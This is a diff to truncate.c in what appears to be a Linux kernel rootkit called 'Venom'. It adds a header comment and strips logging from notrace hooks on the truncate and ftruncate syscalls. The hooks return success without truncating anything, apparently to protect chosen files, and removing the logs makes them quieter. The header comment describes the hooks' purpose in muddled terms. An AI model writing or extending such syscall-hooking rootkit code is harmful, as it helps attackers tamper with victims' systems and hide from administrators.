@@ -1,3 +1,19 @@
+/* 
+ * Venom 
+ * ---------------------------------------------------------------------------
+ * File: truncate.c 
+ *
+ * Purpose:
+ *  - Hooks `orig_truncate_t` and `orig_ftruncate_t` this doesn't allow to view any size of bytes from files 
+ *
+ * Contents (documentation-only):
+ *  - Does not allow to read certain files
+ * 
+ * Author: devilzsecurity 
+ */
+
+
+
 #ifndef TRUNCATE_HOOK_H
 #define TRUNCATE_HOOK_H
 
@@ -23,11 +39,6 @@ notrace asmlinkage long hook_truncate(const struct pt_regs *regs)
     if (pathname && strncpy_from_user(kd, pathname, sizeof(kd) - 1) < 0)
         kd[0] = '\0';
     
-
-    TLOG_INF("[VENOM] HOOKED TRUNCATE\n");
-    TLOG_INF("[VENOM] File Descriptor: %d\n", fd);
-    TLOG_INF("[VENOM] Length: %lu\n", length);
-
     return 0; 
 }
 
@@ -37,10 +48,6 @@ notrace asmlinkage long hook_ftruncate(const struct pt_regs *regs)
     int fd = (int)regs->di;
     unsigned long length = (unsigned long)regs->si;
 
-
-    TLOG_INF("[VENOM] HOOKED FTRUNCATE\n");
-    TLOG_INF("[VENOM] File Descriptor: %d\n", fd);
-    TLOG_INF("[VENOM] Length: %lu\n", length);
 
     return 0;
 }
